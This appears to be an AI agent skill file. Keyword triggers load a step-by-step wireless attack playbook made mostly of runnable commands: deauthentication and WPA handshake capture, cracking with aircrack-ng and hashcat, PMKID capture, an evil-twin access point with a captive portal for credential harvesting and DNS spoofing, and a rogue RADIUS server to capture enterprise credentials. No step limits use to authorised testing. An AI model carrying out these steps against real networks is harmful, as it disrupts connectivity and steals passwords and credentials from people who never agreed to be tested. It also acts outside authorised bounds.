# SKILL: Wireless Network Attacks

## Description
WiFi and wireless protocol attack methodology covering WPA/WPA2/WPA3, evil twin, and wireless recon.

## Trigger Phrases
wifi, wireless, wpa, wpa2, aircrack, handshake, deauth, evil twin, monitor mode

## Methodology

### Phase 1: Recon
1. Enable monitor mode: `airmon-ng start wlan0`
2. Scan networks: `airodump-ng wlan0mon`
3. Target specific AP: `airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon`
4. Identify clients, signal strength, encryption type

### Phase 2: WPA/WPA2 Attack
1. Capture handshake: `aireplay-ng -0 5 -a <BSSID> wlan0mon` (deauth)
2. Verify handshake in capture file
3. Crack with wordlist: `aircrack-ng -w rockyou.txt capture-01.cap`
4. Crack with hashcat: `hashcat -m 22000 hash.hc22000 rockyou.txt`
5. PMKID attack: `hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng`

### Phase 3: Evil Twin
1. Create AP: `hostapd evil_twin.conf`
2. DHCP server: `dnsmasq -C dnsmasq.conf`
3. Captive portal for credential harvesting
4. DNS spoofing for targeted attacks

### Phase 4: WPA Enterprise
1. Setup rogue RADIUS: `hostapd-mana`
2. Capture EAP credentials
3. Crack captured hashes
